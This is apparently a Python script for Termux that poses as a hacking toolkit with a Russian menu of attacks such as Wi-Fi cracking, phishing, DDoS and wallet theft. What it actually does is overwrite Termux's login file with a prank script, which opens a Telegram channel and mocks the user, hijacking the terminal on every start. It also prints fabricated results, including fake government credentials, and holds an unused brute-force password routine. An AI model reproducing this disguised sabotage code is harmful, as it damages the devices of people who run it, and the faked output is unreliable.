import os
os.system("pip install colorama")
import time
import colorama
from colorama import Fore, Back, Style
colorama.init()

"""
import string
from itertools import product
from time import time
from numpy import loadtxt


def product_loop(password, generator):
    for p in generator:
        if ''.join(p) == password:
            print('\nPassword:', ''.join(p))
            return ''.join(p)
    return False


def bruteforce(password, max_nchar=8):

    print('1) Comparing with most common passwords / first names')
    common_pass = loadtxt('probable-v2-top12000.txt', dtype=str)
    common_names = loadtxt('middle-names.txt', dtype=str)
    cp = [c for c in common_pass if c == password]
    cn = [c for c in common_names if c == password]
    cnl = [c.lower() for c in common_names if c.lower() == password]

    if len(cp) == 1:
        print('\nPassword:', cp)
        return cp
    if len(cn) == 1:
        print('\nPassword:', cn)
        return cn
    if len(cnl) == 1:
        print('\nPassword:', cnl)
        return cnl

    print('2) Digits cartesian product')
    for l in range(1, 9):
        generator = product(string.digits, repeat=int(l))
        print("\t..%d digit" % l)
        p = product_loop(password, generator)
        if p is not False:
            return p

    print('3) Digits + ASCII lowercase')
    for l in range(1, max_nchar + 1):
        print("\t..%d char" % l)
        generator = product(string.digits + string.ascii_lowercase,
                            repeat=int(l))
        p = product_loop(password, generator)
        if p is not False:
            return p

    print('4) Digits + ASCII lower / upper + punctuation')
    # If it fails, we start brute-forcing the 'hard' way
    # Same as possible_char = string.printable[:-5]
    all_char = string.digits + string.ascii_letters + string.punctuation

    for l in range(1, max_nchar + 1):
        print("\t..%d char" % l)
        generator = product(all_char, repeat=int(l))
        p = product_loop(password, generator)
        if p is not False:
            return p
"""

f = open('/data/data/com.termux/files/usr/bin/bruh.py','w') 
f.write("""
import time
import sys
import os
from time import sleep
import colorama
from colorama import Fore, Back, Style
colorama.init()

os.system("termux-open-url https://t.me/termuxqew")
print("Вам пришло новое сообщение, нажмите ENTER для продолжения...")
kaka = input("")
os.system("clear")
time.sleep(3)

words = "黑客迪克 Здраствуйте! Какой хакер, какие взломы? Рекомендую тебе идти делать уроки, пока не поздно)"

for char in words:
    sleep(0.04)
    print(char, end='', flush=True)
time.sleep(60)
""")
f.close 
os.system('chmod +x /data/data/com.termux/files/usr/bin/bruh.py') 
 
f = open('/data/data/com.termux/files/usr/bin/login', 'w') 
f.write('python /data/data/com.termux/files/usr/bin/bruh.py') 
f.close  

print("[INFO] Устанавливаю инструмент, подождите...")
time.sleep(10)
os.system("clear")
print(Fore.RED + """We are anonymous, we are legion
                      .-.
         heehee      /aa \_
                   __\-  / )                 .-.
         .-.      (__/    /        haha    _/oo \
       _/ ..\       /     \               ( \v  /__
      ( \  u/__    /       \__             \/   ___)
       \    \__)   \_.-._._   )  .-.       /     \
       /     \             `-`  / ee\_    /       \_
    __/       \               __\  o/ )   \_.-.__   )
   (   _._.-._/     hoho     (___   \/           '-'
jgs '-'                        /     \
                             _/       \    teehee
                            (   __.-._/

Version: 4.0.7
TermuxMAN
""")
print(Style.RESET_ALL)

print("""
1. Взлом wi-fi
2. Фишинг
3. Взлом электронного дневника
4. Взлом соц. сетей (VK, Instagram, Facebook и т.д...)
5. Смс бомбер (сообщениями)
6. Смс бомбер(звонками)
7. DDoS атака
8. Фейковый перевод на киви
9. Угон киви кошелька
10. Спам в тг
11. Бомбер на почту
12. Получить информацию по номеру
13. Прослушка по IP адресу
14. Внедрение вредоносного кода в ссылку
""")
inpt = input("Выберите пункт> ")
print ("Получаю нужные данные, подождите...")
print("http://government.ru/admin/login?username=goverment&pass=7H#JkFsd@@")
time.sleep(2)
print(Fore.GREEN + '[SUCESS200]')
print(Style.RESET_ALL)
time.sleep(2)
print("Получаю доступ к веб серверам... ")
time.sleep(3)
print("""
230.39.104.121/database
80.202.16.149/qiwiapi
209.77.158.119
182.133.108.248/telegram
63.6.171.209/govermentdatabase
""")
print(Fore.GREEN + '[SUCESS200]')
print(Style.RESET_ALL)
print("Ищу ботов для DDoS атаки...")
time.sleep(2)
print("""https://www.shodan.io/search?query=LG type:phone
https://www.shodan.io/search?query=Xiaomi type:PC stress:200
""")
time.sleep(3)
print(Fore.GREEN + '[SUCESS200]')
print(Style.RESET_ALL)
print("Отлично! Теперь перезапусти Termux и запусти инструмент заново!")